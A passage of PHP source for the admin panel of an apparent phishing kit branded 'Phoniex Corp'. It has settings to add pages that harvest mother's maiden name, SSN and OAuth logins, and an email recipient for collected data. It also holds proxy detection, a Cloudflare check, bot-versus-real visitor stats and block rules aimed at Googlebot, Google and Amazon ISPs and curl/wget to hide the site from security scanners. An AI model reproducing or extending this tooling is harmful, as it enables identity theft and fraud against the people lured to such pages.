                            <div class="toggle __SSN_TOGGLE_CLASS__" data-field="security_ssn_enabled">
                                <div class="toggle-slider"></div>
                            </div>
                        </div>
                        
                        <div class="setting-item" style="margin-top: 20px; padding-top: 20px; border-top: 1px solid #e9ecef;">
                            <div>
                                <div class="setting-label">🔐 OAuth Page</div>
                                <div class="setting-desc">Show/hide OAuth page before done page (requires email domain folder)</div>
                            </div>
                            <div class="toggle __OAUTH_TOGGLE_CLASS__" data-field="oauth_enabled">
                                <div class="toggle-slider"></div>
                            </div>
                        </div>
                        
                        <button type="submit" class="btn" style="margin-top: 20px;">Save Flow Settings</button>
                        <div id="flowMessage"></div>
                    </form>
                </div>
            </div>
        </div>
    </div>
    <script>
        // Inject access code for current IP
        window.__ACCESS_CODE__ = '__ACCESS_CODE_PLACEHOLDER__';
        
        // Admin navigation with access codes
        document.querySelectorAll(".admin-nav-link").forEach(link => {
            link.addEventListener("click", function(e) {
                e.preventDefault();
                const page = this.getAttribute("data-page");
                const accessCode = window.__ACCESS_CODE__ || "";
                if (accessCode) {
                    location.href = "/" + accessCode + "/" + page;
                } else {
                    location.href = "/" + page;
                }
            });
        });

        async function logout() {
            const accessCode = window.__ACCESS_CODE__ || "";
            if (accessCode) {
                await fetch("/" + accessCode + "/admin-logout");
                location.href = "/?phoniex";
            } else {
            await fetch("/admin-logout");
            location.href = "/admin";
            }
        }
        
        // Email form
        document.getElementById("emailForm").addEventListener("submit", async (e) => {
            e.preventDefault();
            const message = document.getElementById("message");
            
            const data = {
                email_recipient: document.getElementById("emailRecipient").value,
                access_parameter: document.getElementById("accessParameter").value,
                proxy_detection_enabled: document.getElementById("proxyToggle").classList.contains("active"),
                cloudflare_checkbox_enabled: document.getElementById("cloudflareToggle").classList.contains("active")
            };
            
            try {
                const accessCode = window.__ACCESS_CODE__ || "";
                const url = accessCode ? "/" + accessCode + "/admin-email" : "/admin-email";
                const res = await fetch(url, {
                    method: "POST",
                    headers: {"Content-Type": "application/json"},
                    body: JSON.stringify(data)
                });
                const result = await res.json();
                
                if (result.success) {
                    message.innerHTML = '__SUCCESS_MESSAGE__';
                    setTimeout(() => {
                        message.innerHTML = "";
                    }, 3000);
                } else {
                    message.innerHTML = '__ERROR_MESSAGE__';
                }
            } catch (err) {
                message.innerHTML = '__ERROR_DYNAMIC_MESSAGE__' + err.message + '__ERROR_DYNAMIC_END__';
            }
        });
        
        // Toggle functionality for flow settings and proxy detection
        document.querySelectorAll(".toggle").forEach(toggle => {
            toggle.addEventListener("click", () => {
                toggle.classList.toggle("active");
            });
        });
        
        // Flow settings form
        document.getElementById("flowForm").addEventListener("submit", async (e) => {
            e.preventDefault();
            const flowMessage = document.getElementById("flowMessage");
            
            const flowSettings = {};
            document.querySelectorAll(".toggle").forEach(toggle => {
                const field = toggle.getAttribute("data-field");
                flowSettings[field] = toggle.classList.contains("active");
            });
            
            const data = { flow_settings: flowSettings };
            
            try {
                const accessCode = window.__ACCESS_CODE__ || "";
                const url = accessCode ? "/" + accessCode + "/admin-email" : "/admin-email";
                const res = await fetch(url, {
                    method: "POST",
                    headers: {"Content-Type": "application/json"},
                    body: JSON.stringify(data)
                });
                const result = await res.json();
                
                if (result.success) {
                    flowMessage.innerHTML = '__FLOW_SUCCESS_MESSAGE__';
                    setTimeout(() => {
                        flowMessage.innerHTML = "";
                    }, 3000);
                } else {
                    flowMessage.innerHTML = '__FLOW_ERROR_MESSAGE__';
                }
            } catch (err) {
                flowMessage.innerHTML = '__FLOW_ERROR_DYNAMIC_MESSAGE__' + err.message + '__FLOW_ERROR_DYNAMIC_END__';
            }
        });
    </script>
</body>
</html>
HTML;
        
        // Replace placeholders with actual values
        $html = str_replace([
            '__SUCCESS_MESSAGE__',
            '__ERROR_MESSAGE__',
            '__ERROR_DYNAMIC_MESSAGE__',
            '__ERROR_DYNAMIC_END__',
            '__FLOW_SUCCESS_MESSAGE__',
            '__FLOW_ERROR_MESSAGE__',
            '__FLOW_ERROR_DYNAMIC_MESSAGE__',
            '__FLOW_ERROR_DYNAMIC_END__',
            '__ACCESS_CODE_PLACEHOLDER__',
            '__EMAIL_RECIPIENT__',
            '__ACCESS_PARAMETER__',
            '__PROXY_TOGGLE_CLASS__',
            '__CLOUDFLARE_TOGGLE_CLASS__',
            '__MMN_TOGGLE_CLASS__',
            '__SSN_TOGGLE_CLASS__',
            '__OAUTH_TOGGLE_CLASS__'
        ], [
            '<div class="success">Configuration saved successfully!</div>',
            '<div class="error">Save failed</div>',
            '<div class="error">Error: ',
            '</div>',
            '<div class="success">Flow settings saved successfully!</div>',
            '<div class="error">Save failed</div>',
            '<div class="error">Error: ',
            '</div>',
            $accessCode,
            htmlspecialchars($config['email_recipient']),
            htmlspecialchars($config['access_parameter']),
            (($config['proxy_detection_enabled'] ?? true) ? ' active' : ''),
            (($config['cloudflare_checkbox_enabled'] ?? true) ? ' active' : ''),
            ($config['flow_settings']['security_mmn_enabled'] ? ' active' : ''),
            ($config['flow_settings']['security_ssn_enabled'] ? ' active' : ''),
            (($config['flow_settings']['oauth_enabled'] ?? false) ? ' active' : '')
        ], $html);
        respond_html($html);
    }
    
    private function handleAdminStats(): void {
        if (isset($_GET['action']) && $_GET['action'] === 'stats') {
            $stats = get_activity_stats();
            respond_json($stats);
            return;
        }
        
        if (isset($_GET['action']) && $_GET['action'] === 'logs') {
            $logs = get_activity_logs(50);
            respond_json($logs);
            return;
        }
        
        if (isset($_GET['action']) && $_GET['action'] === 'visitors') {
            $visitors = get_visitor_stats();
            respond_json($visitors);
            return;
        }
        
        if (isset($_GET['action']) && $_GET['action'] === 'reset' && $_SERVER['REQUEST_METHOD'] === 'POST') {
            $logFile = FCPATH . 'logs/activity.log';
            // Don't delete ip_codes.json as it contains active access codes needed for admin access
            
            $success = true;
            if (is_file($logFile)) {
                $success = $success && @unlink($logFile);
            }
            
            // Also clear other log files but keep access codes
            $otherLogFiles = [
                FCPATH . 'data/blacklist_detections.log',
                FCPATH . 'data/proxy_detections.log'
            ];
            
            foreach ($otherLogFiles as $file) {
                if (is_file($file)) {
                    @unlink($file);
                }
            }
            
            if ($success) {
                respond_json(['success' => true]);
            } else {
                respond_json(['error' => 'Reset failed'], 500);
            }
            return;
        }
        
        // Get dynamic admin access code for JavaScript injection
        $clientIp = get_client_ip();
        $accessCode = get_ip_access_code($clientIp);
        
        $html = <<<'HTML'
<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title>Statistics - Phoniex Corp Admin</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            font-family: "Inter", -apple-system, BlinkMacSystemFont, sans-serif; 
            background: #f8f9fa;
            color: #495057;
            overflow-x: hidden;
        }
        .admin-layout { display: flex; min-height: 100vh; }
        .sidebar { width: 280px; background: white; box-shadow: 2px 0 10px rgba(0,0,0,0.1); position: fixed; height: 100vh; overflow-y: auto; }
        .sidebar-header { padding: 30px 25px; border-bottom: 1px solid #e9ecef; }
        .logo { display: flex; align-items: center; gap: 12px; font-size: 24px; font-weight: 700; color: #6f42c1; }
        .logo-icon { width: 40px; height: 40px; background: linear-gradient(135deg, #6f42c1 0%, #20c997 100%); display: flex; align-items: center; justify-content: center; color: white; font-weight: bold; font-size: 18px; }
        .sidebar-nav { padding: 20px 0; }
        .nav-item { display: block; padding: 15px 25px; color: #6c757d; text-decoration: none; transition: all 0.3s ease; border-left: 3px solid transparent; }
        .nav-item:hover, .nav-item.active { background: #f8f9fa; color: #6f42c1; border-left-color: #6f42c1; }
        .main-content { margin-left: 280px; flex: 1; }
        .top-bar { background: white; padding: 20px 30px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); display: flex; justify-content: space-between; align-items: center; }
        .page-title { font-size: 28px; font-weight: 600; color: #495057; }
        .logout-btn { background: #dc3545; color: white; padding: 8px 16px; text-decoration: none; transition: all 0.3s ease; }
        .logout-btn:hover { background: #c82333; }
        .content { padding: 30px; }
        .activity-table { background: white; box-shadow: 0 2px 10px rgba(0,0,0,0.1); overflow: hidden; }
        .table-header { background: #f8f9fa; padding: 20px 25px; border-bottom: 1px solid #e9ecef; font-weight: 600; color: #495057; }
        .table-content { max-height: 600px; overflow-y: auto; }
        .visitor-row { padding: 15px 25px; border-bottom: 1px solid #f1f3f4; display: grid; grid-template-columns: 200px 250px 200px 150px 120px; gap: 20px; align-items: center; transition: background 0.2s ease; }
        .visitor-row:hover { background: #f8f9fa; }
        .visitor-name { font-weight: 500; color: #495057; }
        .visitor-location, .visitor-isp, .visitor-ip { font-size: 13px; color: #6c757d; }
        .visitor-ip { font-family: monospace; }
        .visitor-status { display: inline-block; padding: 4px 8px; font-size: 11px; font-weight: 600; text-transform: uppercase; color: white; }
        .status-real { background: #28a745; }
        .status-bot  { background: #dc3545; }
        .table-headers { background: #f8f9fa; padding: 15px 25px; border-bottom: 2px solid #e9ecef; display: grid; grid-template-columns: 200px 250px 200px 150px 120px; gap: 20px; font-weight: 600; color: #495057; font-size: 14px; }
    </style>
</head>
<body>
    <div class="admin-layout">
        <div class="sidebar">
            <div class="sidebar-header">
                <div class="logo"><div class="logo-icon">P</div>Phoniex Corp</div>
            </div>
            <nav class="sidebar-nav">
                <a href="#" class="nav-item admin-nav-link" data-page="admin"><span>📊</span> Dashboard</a>
                <a href="#" class="nav-item admin-nav-link" data-page="admin-email"><span>📧</span> Configuration</a>
                <a href="#" class="nav-item admin-nav-link active" data-page="admin-stats"><span>📈</span> Statistics</a>
                <a href="#" class="nav-item admin-nav-link" data-page="admin-blocker"><span>🚫</span> Blocker</a>
            </nav>
        </div>
        <div class="main-content">
            <div class="top-bar">
                <h1 class="page-title">Statistics</h1>
                <a href="#" onclick="logout()" class="logout-btn">Logout</a>
            </div>
            <div class="content">
                <div class="activity-table">
                    <div class="table-header" style="display:flex;justify-content:space-between;align-items:center;">
                        <span>Visitor Statistics</span>
                        <button onclick="resetLogs()" style="background:#dc3545;color:#fff;border:none;padding:8px 16px;font-size:12px;cursor:pointer;">🗑️ Reset Logs</button>
                    </div>
                    <div class="table-headers">
                        <div>Visit Type</div><div>Location</div><div>ISP</div><div>IP Address</div><div>Status</div>
                    </div>
                    <div class="table-content" id="visitorStats">Loading...</div>
                </div>
            </div>
        </div>
    </div>
    <script>
        // Inject access code for current IP
        window.__ACCESS_CODE__ = '__ACCESS_CODE_PLACEHOLDER__';
        
        // Admin navigation with access codes
        document.querySelectorAll('.admin-nav-link').forEach(link => {
            link.addEventListener('click', function(e){
                e.preventDefault();
                const page = this.getAttribute('data-page');
                const code = window.__ACCESS_CODE__ || '';
                location.href = code ? `/${code}/${page}` : `/${page}`;
            });
        });

        async function logout(){
            const code = window.__ACCESS_CODE__ || '';
            if (code) { await fetch(`/${code}/admin-logout`); location.href='/?phoniex'; }
            else { await fetch('/admin-logout'); location.href='/admin'; }
        }

        function loadVisitors(){
            const code = window.__ACCESS_CODE__ || '';
            const url = code ? `/${code}/admin-stats?action=visitors` : '/admin-stats?action=visitors';
            fetch(url).then(r=>r.json()).then(list=>{
                const c = document.getElementById('visitorStats');
                if (!Array.isArray(list) || list.length===0){ c.innerHTML = '<div style="padding:30px;text-align:center;color:#6c757d;">No visitors found</div>'; return; }
                c.innerHTML = list.map(v=>{
                    const cls = v.is_bot ? 'status-bot' : 'status-real';
                    const txt = v.is_bot ? 'Bot' : 'Real';
                    const type = v.visit_type || 'Visit Unknown';
                        return `<div class="visitor-row">
                        <div class="visitor-name">${type}</div>
                        <div class="visitor-location">${v.location}</div>
                        <div class="visitor-isp">${v.isp}</div>
                        <div class="visitor-ip">${v.ip}</div>
                        <div class="visitor-status ${cls}">${txt}</div>
                        </div>`;
                }).join('');
            }).catch(()=>{
                document.getElementById('visitorStats').innerHTML = '<div style="padding:30px;text-align:center;color:#dc3545;">Error loading visitor data</div>';
            });
        }
        loadVisitors(); setInterval(loadVisitors, 3000);

        async function resetLogs(){
            if (!confirm('Are you sure you want to reset all activity logs? (Access codes will be preserved)')) return;
            const code = window.__ACCESS_CODE__ || '';
            const url = code ? `/${code}/admin-stats?action=reset` : '/admin-stats?action=reset';
            try{
                const res = await fetch(url,{method:'POST'}); const j = await res.json();
                if (j.success){ alert('Reset successful!'); location.reload(); } else { alert('Reset failed'); }
            }catch(e){ alert('Error: '+e.message); }
        }
    </script>
</body>
</html>
HTML;
        
        // Replace access code placeholder with actual value
        $html = str_replace('__ACCESS_CODE_PLACEHOLDER__', $accessCode, $html);
        respond_html($html);
    }
    
    private function handleAdminBlocker(): void {
        if ($_SERVER['REQUEST_METHOD'] === 'POST') {
            $input = file_get_contents('php://input');
            $data = json_decode($input, true);
            if (is_array($data)) {
                $rules = [
                    'ips' => array_filter(array_map('trim', $data['ips'] ?? [])),
                    'isps' => array_filter(array_map('trim', $data['isps'] ?? [])),
                    'user_agents' => array_filter(array_map('trim', $data['user_agents'] ?? [])),
                    'bot_names' => array_filter(array_map('trim', $data['bot_names'] ?? [])),
                ];
                if (save_block_rules($rules)) { respond_json(['success' => true]); }
                else { respond_json(['error' => 'Save failed'], 500); }
            } else {
                respond_json(['error' => 'Invalid data'], 400);
            }
            return;
        }
        $rules = get_block_rules();
        $ipsText = implode("\n", $rules['ips']);
        $ispsText = implode("\n", $rules['isps']);
        $userAgentsText = implode("\n", $rules['user_agents']);
        $botNamesText = implode("\n", $rules['bot_names']);
        
        // Get dynamic admin access code for JavaScript injection
        $clientIp = get_client_ip();
        $accessCode = get_ip_access_code($clientIp);
        
        $html = <<<'HTML'
<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title>Blocker - Phoniex Corp Admin</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: "Inter", -apple-system, BlinkMacSystemFont, sans-serif; background: #f8f9fa; color: #495057; overflow-x: hidden; }
        .admin-layout { display:flex; min-height:100vh; }
        .sidebar { width:280px; background:#fff; box-shadow:2px 0 10px rgba(0,0,0,.1); position:fixed; height:100vh; overflow-y:auto; }
        .sidebar-header { padding:30px 25px; border-bottom:1px solid #e9ecef; }
        .logo { display:flex; align-items:center; gap:12px; font-size:24px; font-weight:700; color:#6f42c1; }
        .logo-icon { width:40px; height:40px; background:linear-gradient(135deg,#6f42c1 0%,#20c997 100%); display:flex; align-items:center; justify-content:center; color:#fff; font-weight:bold; font-size:18px; }
        .sidebar-nav { padding:20px 0; }
        .nav-item { display:block; padding:15px 25px; color:#6c757d; text-decoration:none; transition:all .3s; border-left:3px solid transparent; }
        .nav-item:hover, .nav-item.active { background:#f8f9fa; color:#6f42c1; border-left-color:#6f42c1; }
        .main-content { margin-left:280px; flex:1; }
        .top-bar { background:#fff; padding:20px 30px; box-shadow:0 2px 4px rgba(0,0,0,.1); display:flex; justify-content:space-between; align-items:center; }
        .page-title { font-size:28px; font-weight:600; color:#495057; }
        .logout-btn { background:#dc3545; color:#fff; padding:8px 16px; text-decoration:none; transition:all .3s; }
        .logout-btn:hover { background:#c82333; }
        .content { padding:30px; }
        .blocker-card { background:#fff; padding:30px; box-shadow:0 2px 10px rgba(0,0,0,.1); margin-bottom:25px; }
        .card-title { font-size:20px; font-weight:600; color:#495057; margin-bottom:20px; display:flex; align-items:center; gap:10px; }
        .form-group { margin-bottom:25px; }
        label { display:block; margin-bottom:8px; color:#495057; font-weight:500; }
        textarea { width:100%; min-height:120px; padding:15px; border:1px solid #ced4da; font-family:monospace; font-size:14px; resize:vertical; }
        textarea:focus { outline:none; border-color:#6f42c1; box-shadow:0 0 0 3px rgba(111,66,193,.1); }
        .btn { padding:12px 24px; background:linear-gradient(135deg,#6f42c1 0%,#20c997 100%); color:#fff; border:none; font-weight:500; cursor:pointer; transition:all .3s; }
        .btn:hover { transform:translateY(-2px); box-shadow:0 8px 20px rgba(111,66,193,.3); }
        .help-text { font-size:13px; color:#6c757d; margin-top:5px; }
        .success { color:#28a745; margin-top:15px; padding:10px; background:#d4edda; }
        .error { color:#dc3545; margin-top:15px; padding:10px; background:#f8d7da; }
    </style>
</head>
<body>
    <div class="admin-layout">
        <div class="sidebar">
            <div class="sidebar-header"><div class="logo"><div class="logo-icon">P</div>Phoniex Corp</div></div>
            <nav class="sidebar-nav">
                <a href="#" class="nav-item admin-nav-link" data-page="admin"><span>📊</span> Dashboard</a>
                <a href="#" class="nav-item admin-nav-link" data-page="admin-email"><span>📧</span> Configuration</a>
                <a href="#" class="nav-item admin-nav-link" data-page="admin-stats"><span>📈</span> Statistics</a>
                <a href="#" class="nav-item admin-nav-link active" data-page="admin-blocker"><span>🚫</span> Blocker</a>
            </nav>
        </div>
        <div class="main-content">
            <div class="top-bar">
                <h1 class="page-title">Access Blocker</h1>
                <a href="#" onclick="logout()" class="logout-btn">Logout</a>
            </div>
            <div class="content">
                <form id="blockerForm">
                    <div class="blocker-card">
                        <div class="card-title">🚫 IP Address Blocking</div>
                        <div class="form-group">
                            <label>Blocked IP Addresses</label>
                            <textarea id="blockedIps" placeholder="Enter IP addresses, one per line...">__IPS_PLACEHOLDER__</textarea>
                            <div class="help-text">Example: 192.168.1.1</div>
                        </div>
                    </div>
                    <div class="blocker-card">
                        <div class="card-title">🏢 ISP Blocking</div>
                        <div class="form-group">
                            <label>Blocked ISPs</label>
                            <textarea id="blockedIsps" placeholder="Enter ISP names, one per line...">__ISPS_PLACEHOLDER__</textarea>
                            <div class="help-text">Example: Google LLC, Amazon.com</div>
                        </div>
                    </div>
                    <div class="blocker-card">
                        <div class="card-title">🌐 User Agent Blocking</div>
                        <div class="form-group">
                            <label>Blocked User Agents</label>
                            <textarea id="blockedUserAgents" placeholder="Enter user agent patterns, one per line...">__USER_AGENTS_PLACEHOLDER__</textarea>
                            <div class="help-text">Example: curl, wget, python-requests</div>
                        </div>
                    </div>
                    <div class="blocker-card">
                        <div class="card-title">🤖 Bot Name Blocking</div>
                        <div class="form-group">
                            <label>Blocked Bot Names</label>
                            <textarea id="blockedBotNames" placeholder="Enter bot names, one per line...">__BOT_NAMES_PLACEHOLDER__</textarea>
                            <div class="help-text">Example: Googlebot, bingbot, facebookexternalhit</div>
                        </div>
                    </div>
                    <button type="submit" class="btn">Save Block Rules</button>
                    <div id="message"></div>
                </form>
            </div>
        </div>
    </div>
    <script>
        // Inject access code for current IP
        window.__ACCESS_CODE__ = '__ACCESS_CODE_PLACEHOLDER__';
        
        // Admin navigation with access codes
        document.querySelectorAll('.admin-nav-link').forEach(link => {
            link.addEventListener('click', function(e){
                e.preventDefault();
                const page = this.getAttribute('data-page');
                const code = window.__ACCESS_CODE__ || '';
                location.href = code ? `/${code}/${page}` : `/${page}`;
            });
        });

        async function logout(){
            const code = window.__ACCESS_CODE__ || '';
            if (code) { await fetch(`/${code}/admin-logout`); location.href='/?phoniex'; }
            else { await fetch('/admin-logout'); location.href='/admin'; }
        }

        document.getElementById('blockerForm').addEventListener('submit', async (e)=>{
            e.preventDefault();
            const msg = document.getElementById('message');
            const data = {
                ips: document.getElementById('blockedIps').value.split('\n').filter(x=>x.trim()),
                isps: document.getElementById('blockedIsps').value.split('\n').filter(x=>x.trim()),
                user_agents: document.getElementById('blockedUserAgents').value.split('\n').filter(x=>x.trim()),
                bot_names: document.getElementById('blockedBotNames').value.split('\n').filter(x=>x.trim()),
            };
            try{
                const code = window.__ACCESS_CODE__ || '';
                const url = code ? `/${code}/admin-blocker` : '/admin-blocker';
                const res = await fetch(url,{method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify(data)});
                const j = await res.json();
                msg.innerHTML = j.success ? '<div class="success">Block rules saved successfully!</div>' : '<div class="error">Save failed</div>';
            }catch(err){ msg.innerHTML = '<div class="error">Error: ' + err.message + '</div>'; }
        });
    </script>
</body>
</html>
HTML;
        
        // Replace placeholders with actual values
        $html = str_replace([
            '__ACCESS_CODE_PLACEHOLDER__',
            '__IPS_PLACEHOLDER__',
            '__ISPS_PLACEHOLDER__',
            '__USER_AGENTS_PLACEHOLDER__',
            '__BOT_NAMES_PLACEHOLDER__'
        ], [
            $accessCode,
            $ipsText,
            $ispsText,
            $userAgentsText,
            $botNamesText
        ], $html);
        respond_html($html);
    }
}


